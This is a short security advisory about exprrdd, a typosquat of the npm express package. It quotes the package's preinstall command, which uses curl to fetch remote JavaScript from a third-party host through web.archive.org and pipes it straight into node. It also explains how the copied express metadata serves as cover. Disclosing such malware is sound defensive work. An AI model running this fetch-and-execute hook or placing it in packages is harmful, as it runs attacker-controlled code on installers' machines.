summary: exprrdd preinstall fetches and executes remote JavaScript at install time (express typosquat)
details: exprrdd@5.2.2 is a typosquat of the express package. Its package.json preinstall script runs `curl -L https://web.archive.org/web/https://gitflic.ru/project/hellscripter/install-scripts/blob/raw?file=node.js | node`, piping remote JavaScript from a third-party gitflic.ru project (`hellscripter/install-scripts`), proxied through web.archive.org, directly into node at install time with no version pin and no integrity check. The manifest copies express's author, contributors, repository (expressjs/express), homepage, keywords, and full dependency list verbatim as cover while the real payload is the preinstall-fetched script. Any `npm install exprrdd` auto-executes attacker-controlled code on the installer's machine with the installer's privileges.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
